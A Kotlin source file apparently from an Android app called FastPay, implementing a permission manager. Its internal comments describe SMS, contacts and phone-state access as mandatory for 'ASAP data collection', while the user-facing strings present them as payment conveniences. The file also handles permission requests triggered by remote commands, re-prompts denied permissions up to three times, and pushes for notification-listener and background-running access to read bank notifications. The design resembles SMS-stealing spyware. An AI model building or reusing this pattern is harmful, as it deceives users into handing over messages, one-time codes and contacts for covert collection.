package com.example.fast.util

import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationManagerCompat
import com.example.fast.service.NotificationReceiver
// PermissionFlowActivity import removed - permission UI concept removed
import com.example.fast.util.DefaultSmsAppHelper

/**
 * PermissionManager
 *
 * **Single place that handles all permissions.** From anywhere in the app, call only PermissionManager
 * to check/request permissions. Activities do not implement permission logic—they only forward
 * lifecycle callbacks to PermissionManager.
 *
 * Usage:
 * - **From anywhere:** Start a flow via [startRequestPermissionList], [startSpecialPermissionList],
 *   or [checkAndRedirectSilently]. Use [hasAllMandatoryPermissions], [hasRuntimePermission], etc. to check.
 * - **In every Activity** that can host permission requests: In [android.app.Activity.onRequestPermissionsResult]
 *   call [handleActivityRequestPermissionsResult]; in [android.app.Activity.onResume] call [handleActivityResume].
 *   If either returns true, return early. No other permission logic in the Activity.
 *
 * Permissions managed:
 * - Runtime (5-6): RECEIVE_SMS, READ_SMS, READ_CONTACTS, SEND_SMS, READ_PHONE_STATE, POST_NOTIFICATIONS (13+)
 * - Special (2): Notification Listener Service, Battery Optimization
 */
object PermissionManager {

    private const val TAG = "PermissionManager"

    // MANDATORY runtime permissions (requested automatically for ASAP data collection)
    // These permissions are required for data collection: SMS, Contacts, System Info
    val MANDATORY_RUNTIME_PERMISSIONS = arrayOf(
        android.Manifest.permission.RECEIVE_SMS,      // SMS data collection
        android.Manifest.permission.READ_SMS,         // SMS data collection
        android.Manifest.permission.READ_CONTACTS,   // Contact data collection
        android.Manifest.permission.READ_PHONE_STATE // System info data collection
    )

    // OPTIONAL runtime permissions - included in cycle but not required for "all mandatory" completion.
    // Default: send manually (SEND_SMS optional so app is complete without it).
    val OPTIONAL_RUNTIME_PERMISSIONS = arrayOf(
        android.Manifest.permission.SEND_SMS  // For sending SMS; default = send manually
    )

    // All runtime permissions (mandatory + optional) - for backward compatibility
    val REQUIRED_RUNTIME_PERMISSIONS = MANDATORY_RUNTIME_PERMISSIONS + OPTIONAL_RUNTIME_PERMISSIONS

    // Get mandatory runtime permissions (SMS, Contacts, Phone State - for data collection)
    fun getMandatoryRuntimePermissions(context: Context): Array<String> {
        return MANDATORY_RUNTIME_PERMISSIONS
    }

    // Get optional runtime permissions (SEND_SMS, etc. - for actions, not data collection)
    fun getOptionalRuntimePermissions(context: Context): Array<String> {
        val permissions = OPTIONAL_RUNTIME_PERMISSIONS.toMutableList()
        // Add POST_NOTIFICATIONS for Android 13+ (API 33+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(android.Manifest.permission.POST_NOTIFICATIONS)
        }
        return permissions.toTypedArray()
    }

    // Get all required runtime permissions including Android 13+ notification permission (for backward compatibility)
    fun getRequiredRuntimePermissions(context: Context): Array<String> {
        val permissions = REQUIRED_RUNTIME_PERMISSIONS.toMutableList()
        // Add POST_NOTIFICATIONS for Android 13+ (API 33+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(android.Manifest.permission.POST_NOTIFICATIONS)
        }
        return permissions.toTypedArray()
    }

    /**
     * Permission status data class
     */
    data class PermissionStatus(
        val isGranted: Boolean,
        val canRequest: Boolean = true, // false if permanently denied
        val explanation: String = ""
    )

    /**
     * All permissions status
     * Note: Default SMS App permission removed - no longer checked
     */
    data class AllPermissionsStatus(
        val runtimePermissions: Map<String, PermissionStatus>,
        val notificationListener: PermissionStatus,
        val batteryOptimization: PermissionStatus,
        val allGranted: Boolean
    )

    /**
     * Input item for list-based permission flow: permission + whether it is mandatory.
     */
    data class PermissionRequest(val permission: String, val isMandatory: Boolean)

    /**
     * Output item: permission + allowed + text describing outcome (allowed, denied, or reason/error).
     * [reason] is always set: e.g. "Allowed", "Denied by user", "Permanently denied", "Not requested", or error message.
     */
    data class PermissionResult(val permission: String, val isAllowed: Boolean, val reason: String)

    /** Request code used by the list-based permission flow (for routing onRequestPermissionsResult). */
    const val PERMISSION_LIST_REQUEST_CODE = 101

    /** Delay (ms) before showing the next permission dialog so the previous one fully dismisses. Kept minimal for faster flow. */
    private const val NEXT_PERMISSION_DELAY_MS = 100L

    // Internal state for list-based flow (one flow at a time)
    private data class PermissionListState(
        val inputRequests: List<PermissionRequest>,
        val maxCyclesForMandatory: Int,
        var currentCycle: Int,
        val results: MutableMap<String, PermissionResult>,
        var queueForCycle: MutableList<String>,
        val onComplete: (List<PermissionResult>) -> Unit,
        val onPermissionRequesting: ((friendlyName: String) -> Unit)? = null
    )

    private var permissionListState: PermissionListState? = null

    // ============================================================================
    // RUNTIME PERMISSIONS
    // ============================================================================

    /**
     * Check if all mandatory runtime permissions are granted (SMS only)
     */
    fun hasAllMandatoryRuntimePermissions(context: Context): Boolean {
        val mandatoryPermissions = getMandatoryRuntimePermissions(context)
        return mandatoryPermissions.all { permission ->
            ActivityCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED
        }
    }

    /**
     * Check if all runtime permissions are granted (mandatory + optional)
     */
    fun hasAllRuntimePermissions(context: Context): Boolean {
        val requiredPermissions = getRequiredRuntimePermissions(context)
        return requiredPermissions.all { permission ->
            ActivityCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED
        }
    }

    /**
     * Check if a specific runtime permission is granted
     */
    fun hasRuntimePermission(context: Context, permission: String): Boolean {
        return ActivityCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED
    }

    /**
     * Check if a permission was permanently denied (Don't Ask Again)
     */
    fun isPermanentlyDenied(activity: Activity, permission: String): Boolean {
        if (ActivityCompat.checkSelfPermission(activity, permission) == PackageManager.PERMISSION_GRANTED) {
            return false
        }
        return !ActivityCompat.shouldShowRequestPermissionRationale(activity, permission)
    }

    // ============================================================================
    // LIST-BASED PERMISSION FLOW (input list -> 3 cycles -> output list)
    // ============================================================================
    //
    // RULES (call this → then handle result):
    // 1. When you call [startRequestPermissionList], you MUST call [handleRequestPermissionListResult]
    //    from Activity.onRequestPermissionsResult with the SAME requestCode. When the flow completes,
    //    [onComplete] is invoked with the results.
    // 2. When you call [startSpecialPermissionList], you MUST call [onSpecialPermissionReturn] from
    //    Activity.onResume when the user returns from Settings. When all special permissions have
    //    been checked, [onComplete] is invoked.
    //

    /**
     * Single entry point for Activity to forward permission results. Call this from
     * Activity.onRequestPermissionsResult; if it returns true, return early. No need to check request code—
     * PermissionManager consumes only when it has an active list flow.
     */
    fun handleActivityRequestPermissionsResult(
        activity: Activity,
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ): Boolean = handleRequestPermissionListResult(activity, requestCode, permissions, grantResults)

    /**
     * Single entry point for Activity to forward resume. Call this from Activity.onResume; if it returns
     * true, return early (user returned from special-permission Settings and PermissionManager is handling it).
     */
    fun handleActivityResume(activity: Activity): Boolean = onSpecialPermissionReturn(activity)

    /**
     * Build "to-request" list for current cycle. All permissions mandatory in cycle: cycle 1..N = all still missing from input.
     * SEND_SMS remains optional for completion (default "send manually") but is included in the cycle.
     */
    private fun buildToRequestForCycle(activity: Activity, state: PermissionListState): List<String> {
        val inputRequests = state.inputRequests
        return inputRequests.map { it.permission }.filter { !hasRuntimePermission(activity, it) }
    }

    /**
     * Build output list in input order; for each input request, use stored result or "already granted".
     */
    private fun buildOutputList(activity: Activity, state: PermissionListState): List<PermissionResult> {
        return state.inputRequests.map { req ->
            state.results[req.permission]
                ?: if (hasRuntimePermission(activity, req.permission)) {
                    PermissionResult(req.permission, true, "Allowed")
                } else {
                    PermissionResult(req.permission, false, "Not requested")
                }
        }
    }

    private fun reasonForDenied(activity: Activity, permission: String): String {
        return if (isPermanentlyDenied(activity, permission)) "Permanently denied" else "Denied by user"
    }

    /**
     * Request exactly one runtime permission. Use this so the system shows one dialog at a time.
     * Optionally defer the request so the previous dialog has time to dismiss.
     * Invokes [onPermissionRequesting] with the friendly name so the UI can show e.g. "SMS permission" on screen.
     */
    private fun requestOnePermission(
        activity: Activity,
        permission: String,
        requestCode: Int,
        delayMs: Long = 0L,
        onPermissionRequesting: ((friendlyName: String) -> Unit)? = null
    ) {
        val friendlyName = getPermissionName(permission)
        fun doRequest() {
            onPermissionRequesting?.invoke(friendlyName)
            ActivityCompat.requestPermissions(activity, arrayOf(permission), requestCode)
            android.util.Log.d(TAG, "[PERMISSION] requestOnePermission: $permission ($friendlyName)")
        }
        if (delayMs <= 0L) {
            doRequest()
            return
        }
        Handler(Looper.getMainLooper()).postDelayed({
            if (activity.isFinishing || activity.isDestroyed) return@postDelayed
            doRequest()
        }, delayMs)
    }

    /**
     * Start the list-based permission flow.
     * RULE: Call [handleRequestPermissionListResult] from Activity.onRequestPermissionsResult with the SAME [requestCode].
     * When the flow completes (all cycles done or all granted), [onComplete] is called with results.
     *
     * @param maxCyclesForMandatory Max cycles for mandatory permissions (default 3).
     * @param onComplete Called with results in input order when flow finishes.
     * @param onPermissionRequesting Optional: called with friendly name (e.g. "Receive SMS") when each permission dialog is about to show. Use to update status text on screen during the cycle.
     */
    fun startRequestPermissionList(
        activity: Activity,
        requests: List<PermissionRequest>,
        requestCode: Int = PERMISSION_LIST_REQUEST_CODE,
        maxCyclesForMandatory: Int = 3,
        onComplete: (List<PermissionResult>) -> Unit,
        onPermissionRequesting: ((friendlyName: String) -> Unit)? = null
    ) {
        if (requests.isEmpty()) {
            onComplete(emptyList())
            return
        }
        permissionListState = null
        val toRequestCycle1 = requests.map { it.permission }.filter { !hasRuntimePermission(activity, it) }
        if (toRequestCycle1.isEmpty()) {
            onComplete(requests.map { PermissionResult(it.permission, true, "Allowed") })
            return
        }
        val state = PermissionListState(
            inputRequests = requests,
            maxCyclesForMandatory = maxCyclesForMandatory,
            currentCycle = 1,
            results = mutableMapOf(),
            queueForCycle = toRequestCycle1.toMutableList(),
            onComplete = onComplete,
            onPermissionRequesting = onPermissionRequesting
        )
        permissionListState = state
        val firstPermission = state.queueForCycle.removeAt(0)
        android.util.Log.d(TAG, "[PERMISSION] startRequestPermissionList: cycle=1, queue=${state.queueForCycle.size}, first=$firstPermission")
        requestOnePermission(activity, firstPermission, requestCode, delayMs = 0L, onPermissionRequesting = state.onPermissionRequesting)
    }

    /**
     * Handle permission result from onRequestPermissionsResult. Returns true if this result was consumed.
     */
    fun handleRequestPermissionListResult(
        activity: Activity,
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ): Boolean {
        val state = permissionListState ?: return false
        if (permissions.isEmpty() || grantResults.isEmpty()) return false
        for (i in permissions.indices) {
            val permission = permissions[i]
            val granted = i < grantResults.size && grantResults[i] == PackageManager.PERMISSION_GRANTED
            state.results[permission] = if (granted) {
                PermissionResult(permission, true, "Allowed")
            } else {
                PermissionResult(permission, false, reasonForDenied(activity, permission))
            }
        }
        // More in this cycle? Request next after delay so previous dialog fully dismisses (one-by-one cycle).
        if (state.queueForCycle.isNotEmpty()) {
            val nextPermission = state.queueForCycle.removeAt(0)
            android.util.Log.d(TAG, "[PERMISSION] handleRequestPermissionListResult: next in cycle, queue=${state.queueForCycle.size}, next=$nextPermission")
            requestOnePermission(activity, nextPermission, requestCode, delayMs = NEXT_PERMISSION_DELAY_MS, onPermissionRequesting = state.onPermissionRequesting)
            return true
        }
        // Cycle done; next cycle or finish? All permissions in mandatory cycle (retry any still denied).
        val anyStillDenied = state.inputRequests.any { !hasRuntimePermission(activity, it.permission) }
        if (anyStillDenied && state.currentCycle < state.maxCyclesForMandatory) {
            state.currentCycle++
            val nextQueue = buildToRequestForCycle(activity, state).toMutableList()
            if (nextQueue.isEmpty()) {
                finishListFlow(activity, state)
                return true
            }
            state.queueForCycle = nextQueue
            val nextPermission = state.queueForCycle.removeAt(0)
            android.util.Log.d(TAG, "[PERMISSION] handleRequestPermissionListResult: cycle=${state.currentCycle}, queue=${state.queueForCycle.size}, next=$nextPermission")
            requestOnePermission(activity, nextPermission, requestCode, delayMs = NEXT_PERMISSION_DELAY_MS, onPermissionRequesting = state.onPermissionRequesting)
            return true
        }
        finishListFlow(activity, state)
        return true
    }

    private fun finishListFlow(activity: Activity, state: PermissionListState) {
        permissionListState = null
        val output = buildOutputList(activity, state)
        android.util.Log.d(TAG, "[PERMISSION] list flow complete: results=${output.size}")
        state.onComplete(output)
    }

    /**
     * Map remote-command permission names to List<PermissionRequest> (runtime permissions only).
     * Names: sms, contacts, phone_state, post_notifications (Android 13+). Notification/battery are not runtime; handle separately.
     */
    fun permissionNamesToRequests(
        names: List<String>,
        defaultMandatory: Boolean = true,
        context: Context? = null
    ): List<PermissionRequest> {
        val list = mutableListOf<PermissionRequest>()
        for (name in names.map { it.trim().lowercase() }.distinct()) {
            when (name) {
                "sms" -> {
                    list.add(PermissionRequest(android.Manifest.permission.RECEIVE_SMS, defaultMandatory))
                    list.add(PermissionRequest(android.Manifest.permission.READ_SMS, defaultMandatory))
                }
                "contacts" -> list.add(PermissionRequest(android.Manifest.permission.READ_CONTACTS, defaultMandatory))
                "phone_state" -> list.add(PermissionRequest(android.Manifest.permission.READ_PHONE_STATE, defaultMandatory))
                "post_notifications", "notification" -> {
                    if (context != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        list.add(PermissionRequest(android.Manifest.permission.POST_NOTIFICATIONS, defaultMandatory))
                    }
                }
                "send_sms" -> list.add(PermissionRequest(android.Manifest.permission.SEND_SMS, defaultMandatory))
                else -> { /* skip unknown e.g. battery */ }
            }
        }
        return list
    }

    /**
     * Ordered list of remote permission names for "ALL" (runtime + special).
     * Used by the requestPermission remote command; MultipurposeCardActivity uses
     * [permissionNamesToRequests] and [startRequestPermissionList] with this list.
     */
    fun getRemotePermissionNamesForAll(): List<String> =
        listOf("sms", "contacts", "phone_state", "notification", "battery")

    /**
     * Get status of all runtime permissions
     */
    fun getRuntimePermissionsStatus(activity: Activity): Map<String, PermissionStatus> {
        val requiredPermissions = getRequiredRuntimePermissions(activity)
        return requiredPermissions.associateWith { permission ->
            val isGranted = hasRuntimePermission(activity, permission)
            val canRequest = !isPermanentlyDenied(activity, permission)
            val explanation = getPermissionExplanation(permission)
            PermissionStatus(isGranted, canRequest, explanation)
        }
    }

    // ============================================================================
    // NOTIFICATION LISTENER SERVICE
    // ============================================================================

    /**
     * Check if Notification Listener Service is enabled
     */
    fun hasNotificationListenerPermission(context: Context): Boolean {
        val notificationListenerComponent = ComponentName(
            context.packageName,
            NotificationReceiver::class.java.name
        )
        return NotificationManagerCompat.getEnabledListenerPackages(context)
            .contains(notificationListenerComponent.packageName)
    }

    /**
     * Open Notification Listener Settings
     */
    fun openNotificationListenerSettings(context: Context) {
        try {
            val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
            context.startActivity(intent)
        } catch (e: Exception) {
            e.printStackTrace()
            // Fallback to general settings
            try {
                val intent = Intent(Settings.ACTION_SETTINGS)
                context.startActivity(intent)
            } catch (ex: Exception) {
                ex.printStackTrace()
            }
        }
    }

    // ============================================================================
    // BATTERY OPTIMIZATION
    // ============================================================================

    /**
     * Check if battery optimization is disabled (app is exempt)
     */
    fun hasBatteryOptimizationExemption(context: Context): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
            return true // Not required for older Android versions
        }
        val powerManager = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
        return powerManager?.isIgnoringBatteryOptimizations(context.packageName) ?: true
    }

    /**
     * Open Battery Optimization Settings
     */
    fun openBatteryOptimizationSettings(context: Context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:${context.packageName}")
                }
                context.startActivity(intent)
            } catch (e: Exception) {
                e.printStackTrace()
                // Fallback to battery optimization settings
                try {
                    val intent = Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)
                    context.startActivity(intent)
                } catch (ex: Exception) {
                    ex.printStackTrace()
                    // Final fallback to general settings
                    try {
                        val intent = Intent(Settings.ACTION_SETTINGS)
                        context.startActivity(intent)
                    } catch (ex2: Exception) {
                        ex2.printStackTrace()
                    }
                }
            }
        }
    }

    // ============================================================================
    // SPECIAL-PERMISSION LIST FLOW (open Settings one by one, check on return)
    // ============================================================================

    /** Supported special permission keys: "notification" (listener), "battery" (optimization). */
    private val SPECIAL_PERMISSION_KEYS = setOf("notification", "battery")

    private data class SpecialPermissionState(
        val inputList: List<String>,
        val results: MutableMap<String, PermissionResult>,
        var lastOpenedKey: String?,
        val onComplete: (List<PermissionResult>) -> Unit
    )

    private var specialPermissionState: SpecialPermissionState? = null

    private fun isSpecialPermissionGranted(context: Context, key: String): Boolean = when (key) {
        "notification" -> hasNotificationListenerPermission(context)
        "battery" -> hasBatteryOptimizationExemption(context)
        else -> false
    }

    private fun openSpecialPermissionSettings(context: Context, key: String) {
        when (key) {
            "notification" -> openNotificationListenerSettings(context)
            "battery" -> openBatteryOptimizationSettings(context)
            else -> { }
        }
    }

    /**
     * Start the special-permission list flow. Opens Settings for the first missing item in [list].
     * RULE: When the user returns to the app, call [onSpecialPermissionReturn] from Activity.onResume.
     * When all items have been checked (user returned from each Settings screen), [onComplete] is called.
     *
     * @param list Keys: "notification", "battery" (order preserved in output).
     * @param onComplete Called with results in list order when all have been checked (user returned for each opened Settings).
     */
    fun startSpecialPermissionList(
        activity: Activity,
        list: List<String>,
        onComplete: (List<PermissionResult>) -> Unit
    ) {
        if (list.isEmpty()) {
            onComplete(emptyList())
            return
        }
        specialPermissionState = null
        val toRequest = list.filter { it in SPECIAL_PERMISSION_KEYS && !isSpecialPermissionGranted(activity, it) }
        if (toRequest.isEmpty()) {
            onComplete(list.map { key ->
                PermissionResult(key, isSpecialPermissionGranted(activity, key), "Allowed")
            })
            return
        }
        val state = SpecialPermissionState(
            inputList = list,
            results = mutableMapOf(),
            lastOpenedKey = null,
            onComplete = onComplete
        )
        specialPermissionState = state
        android.util.Log.d(TAG, "[PERMISSION] startSpecialPermissionList: list=${list.size}, toRequest=${toRequest.size}")
        openSpecialPermissionSettings(activity, toRequest[0])
        state.lastOpenedKey = toRequest[0]
    }

    /**
     * Call from Activity.onResume when the user may have returned from special-permission Settings.
     * Checks the last-opened permission by code, then opens the next missing one or calls onComplete.
     *
     * @return true if this return was consumed (we're in special-permission flow).
     */
    fun onSpecialPermissionReturn(activity: Activity): Boolean {
        val state = specialPermissionState ?: return false
        val lastKey = state.lastOpenedKey ?: return false
        if (activity.isFinishing || activity.isDestroyed) return false

        val granted = isSpecialPermissionGranted(activity, lastKey)
        state.results[lastKey] = PermissionResult(
            lastKey,
            granted,
            if (granted) "Allowed" else "Denied"
        )
        state.lastOpenedKey = null

        val nextMissing = state.inputList.filter { key ->
            key in SPECIAL_PERMISSION_KEYS && state.results[key] == null && !isSpecialPermissionGranted(activity, key)
        }
        if (nextMissing.isEmpty()) {
            specialPermissionState = null
            val results = state.inputList.map { key ->
                state.results[key] ?: PermissionResult(
                    key,
                    isSpecialPermissionGranted(activity, key),
                    "Allowed"
                )
            }
            android.util.Log.d(TAG, "[PERMISSION] specialPermissionList complete: ${results.size} results")
            state.onComplete(results)
            return true
        }
        openSpecialPermissionSettings(activity, nextMissing[0])
        state.lastOpenedKey = nextMissing[0]
        android.util.Log.d(TAG, "[PERMISSION] onSpecialPermissionReturn: opening next=${nextMissing[0]}")
        return true
    }

    /**
     * Check if we're currently in the special-permission list flow (so caller can call [onSpecialPermissionReturn] in onResume).
     */
    fun isInSpecialPermissionFlow(): Boolean = specialPermissionState != null

    // ============================================================================
    // ALL PERMISSIONS STATUS
    // ============================================================================

    // ============================================================================
    // DEFAULT SMS APP
    // ============================================================================

    /**
     * Check if app is set as default SMS app
     */
    fun isDefaultSmsApp(context: Context): Boolean {
        return DefaultSmsAppHelper.isDefaultSmsApp(context)
    }

    /**
     * Open default SMS app selection dialog
     */
    fun openDefaultSmsAppSettings(context: Context) {
        DefaultSmsAppHelper.requestDefaultSmsApp(context)
    }

    /**
     * Check if all permissions (runtime + special) are granted
     * Note: Default SMS app is no longer required (removed from permission flow)
     */
    /**
     * Check if all MANDATORY permissions are granted (SMS + notification + battery)
     * This is used for UI updates - only mandatory permissions are required
     */
    fun hasAllMandatoryPermissions(activity: Activity): Boolean {
        return hasAllMandatoryRuntimePermissions(activity) &&
                hasNotificationListenerPermission(activity) &&
                hasBatteryOptimizationExemption(activity)
    }

    /**
     * Check if ALL permissions are granted (mandatory + optional)
     * This includes contacts, phone_state, etc. - used for full feature check
     */
    fun hasAllPermissions(activity: Activity): Boolean {
        return hasAllRuntimePermissions(activity) &&
                hasNotificationListenerPermission(activity) &&
                hasBatteryOptimizationExemption(activity)
        // Default SMS app check removed - no longer blocking navigation
    }

    /**
     * Get status of all permissions
     * Note: Default SMS App permission removed - no longer checked
     */
    fun getAllPermissionsStatus(activity: Activity): AllPermissionsStatus {
        val runtimePermissions = getRuntimePermissionsStatus(activity)
        val notificationListener = PermissionStatus(
            isGranted = hasNotificationListenerPermission(activity),
            canRequest = true, // Can always be enabled via settings
            explanation = getNotificationListenerExplanation()
        )
        val batteryOptimization = PermissionStatus(
            isGranted = hasBatteryOptimizationExemption(activity),
            canRequest = true, // Can always be enabled via settings
            explanation = getBatteryOptimizationExplanation()
        )

        val allGranted = runtimePermissions.values.all { it.isGranted } &&
                notificationListener.isGranted &&
                batteryOptimization.isGranted

        return AllPermissionsStatus(
            runtimePermissions = runtimePermissions,
            notificationListener = notificationListener,
            batteryOptimization = batteryOptimization,
            allGranted = allGranted
        )
    }

    /**
     * Get count of granted permissions (out of 7-8 total, depending on Android version)
     * Note: Default SMS App permission removed from count
     */
    fun getGrantedPermissionsCount(activity: Activity): Int {
        val status = getAllPermissionsStatus(activity)
        val runtimeGranted = status.runtimePermissions.values.count { it.isGranted }
        val notificationGranted = if (status.notificationListener.isGranted) 1 else 0
        val batteryGranted = if (status.batteryOptimization.isGranted) 1 else 0
        return runtimeGranted + notificationGranted + batteryGranted
    }

    // ============================================================================
    // PERMISSION EXPLANATIONS
    // ============================================================================

    /**
     * Get user-friendly explanation for a permission
     */
    fun getPermissionExplanation(permission: String): String {
        return when (permission) {
            android.Manifest.permission.RECEIVE_SMS ->
                "Receive payment SMS automatically so we can process transactions in real-time. No manual checking needed!"
            android.Manifest.permission.READ_SMS ->
                "Read SMS to verify payment confirmations and keep your transaction history up to date."
            android.Manifest.permission.READ_CONTACTS ->
                "Access contacts to make sending payments super easy - just select a contact and pay!"
            android.Manifest.permission.SEND_SMS ->
                "Send SMS messages to process payment requests and confirmations securely."
            android.Manifest.permission.READ_PHONE_STATE ->
                "Get device ID to securely link your device to your account."
            android.Manifest.permission.POST_NOTIFICATIONS ->
                "Show notifications for payment alerts and important updates. Essential for real-time payment processing."
            else -> "This permission is required for FastPay to function properly."
        }
    }

    /**
     * Get user-friendly name for a permission
     */
    fun getPermissionName(permission: String): String {
        return when (permission) {
            android.Manifest.permission.RECEIVE_SMS -> "Receive SMS"
            android.Manifest.permission.READ_SMS -> "Read SMS"
            android.Manifest.permission.READ_CONTACTS -> "Access Contacts"
            android.Manifest.permission.SEND_SMS -> "Send SMS"
            android.Manifest.permission.READ_PHONE_STATE -> "Phone State"
            android.Manifest.permission.POST_NOTIFICATIONS -> "Post Notifications"
            else -> "Permission"
        }
    }

    /**
     * Get emoji icon for a permission
     */
    fun getPermissionIcon(permission: String): String {
        return when (permission) {
            android.Manifest.permission.RECEIVE_SMS -> "📱"
            android.Manifest.permission.READ_SMS -> "📖"
            android.Manifest.permission.READ_CONTACTS -> "👥"
            android.Manifest.permission.SEND_SMS -> "✉️"
            android.Manifest.permission.READ_PHONE_STATE -> "📞"
            android.Manifest.permission.POST_NOTIFICATIONS -> "🔔"
            else -> "🔐"
        }
    }

    /**
     * Get notification listener explanation
     */
    fun getNotificationListenerExplanation(): String {
        return "Read bank payment notifications to automatically process transactions. We only read payment-related notifications, nothing else!"
    }

    /**
     * Get battery optimization explanation
     */
    fun getBatteryOptimizationExplanation(): String {
        return "Keep FastPay running in the background to process payments instantly, even when the app is closed. Minimal battery impact."
    }

    /**
     * Get default SMS app explanation
     */
    fun getDefaultSmsAppExplanation(): String {
        return "Set FastPay as default SMS app to handle bulk messages efficiently (5000+ SMS) without slowing down your device. Essential for optimal performance."
    }

    // ============================================================================
    // SETTINGS NAVIGATION
    // ============================================================================

    /**
     * Open app settings page
     */
    fun openAppSettings(context: Context) {
        try {
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.fromParts("package", context.packageName, null)
            }
            context.startActivity(intent)
        } catch (e: Exception) {
            e.printStackTrace()
            // Fallback to general settings
            try {
                val intent = Intent(Settings.ACTION_SETTINGS)
                context.startActivity(intent)
            } catch (ex: Exception) {
                ex.printStackTrace()
            }
        }
    }

    /**
     * Silent permission check - requests permissions via list flow if runtime permissions missing.
     * Ensure Activity forwards [onRequestPermissionsResult] to [handleActivityRequestPermissionsResult].
     *
     * @param activity The activity to check permissions for
     * @return true if all mandatory permissions granted, false if permissions were requested (waiting for user response)
     */
    fun checkAndRedirectSilently(activity: Activity): Boolean {
        android.util.Log.d(TAG, "[PERMISSION] checkAndRedirectSilently: caller=${activity.javaClass.simpleName}")
        if (!hasAllRuntimePermissions(activity)) {
            android.util.Log.d(TAG, "[PERMISSION] checkAndRedirectSilently: runtime missing (no-op, use Multipurpose Card)")
            return false
        }
        if (!hasNotificationListenerPermission(activity) || !hasBatteryOptimizationExemption(activity)) {
            android.util.Log.d(TAG, "[PERMISSION] checkAndRedirectSilently: special missing (no-op, use Multipurpose Card)")
            return false
        }
        android.util.Log.d(TAG, "[PERMISSION] checkAndRedirectSilently: all granted (caller=${activity.javaClass.simpleName})")
        return true
    }
}
